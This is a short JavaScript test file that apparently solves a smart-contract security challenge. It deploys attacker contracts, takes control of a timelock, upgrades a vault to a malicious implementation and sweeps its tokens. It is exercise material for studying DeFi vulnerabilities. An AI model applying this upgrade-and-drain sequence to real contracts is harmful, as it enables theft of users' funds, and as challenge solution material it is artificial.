const VaultBreaker = require('../../artifacts/contracts/attacker-contracts/ClimberAttack.sol/VaultBreaker.json')
const MalicousVault = require('../../artifacts/contracts/attacker-contracts/MaliciousVault.sol/MaliciousVault.json')
it('Exploit', async function () {        

        this.breakerFactory = await ethers.getContractFactory(VaultBreaker.abi, VaultBreaker.bytecode, attacker)
        this.malVaultFactory = await ethers.getContractFactory(MalicousVault.abi, MalicousVault.bytecode, attacker)
        this.breaker = await this.breakerFactory.deploy()
        this.malVault = await this.malVaultFactory.deploy()

        await this.breaker.callOne(this.timelock.address)
        await this.breaker.upgradeVault(this.vault.address, this.malVault.address)
        await this.vault.connect(attacker).sweepFunds(this.token.address)
});
